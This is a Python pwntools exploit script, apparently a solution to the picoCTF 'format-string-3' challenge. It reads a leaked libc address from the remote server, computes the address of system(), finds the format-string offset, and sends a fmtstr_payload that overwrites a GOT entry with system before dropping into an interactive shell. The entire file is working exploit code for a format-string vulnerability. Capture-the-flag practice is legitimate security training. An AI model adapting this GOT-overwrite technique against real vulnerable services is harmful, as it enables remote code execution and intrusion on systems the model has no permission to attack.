#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

elf = ELF("libc.so.6")

#conn = process(["./format-string-3_patched"])
address = "rhea.picoctf.net"
port = 65145
conn = remote(address, port)

conn.recvuntil(b"libc: ")
setvbuf_base = int(conn.recvline(), 16)
log.info(f"setvbuf base: {hex(setvbuf_base)}")
libc_base = setvbuf_base - elf.symbols["setvbuf"]
log.info(f"libc base: {hex(libc_base)}")
system_base = libc_base + elf.symbols["system"]
log.info(f"system base: {hex(system_base)}")

def discover_offset(payload):
    log.debug(payload)
    #c = process(["./format-string-3_patched"])
    c = remote(address, port)
    c.recvlines(2)
    c.sendline(payload)
    res = c.recvall()
    log.debug(res)
    return res

fmt = FmtStr(discover_offset)
offset = fmt.offset

payload = fmtstr_payload(offset, {0x404018: system_base})
with open("payload", "wb") as f:
    f.write(payload)
    f.close()
conn.sendline(payload)
conn.interactive()

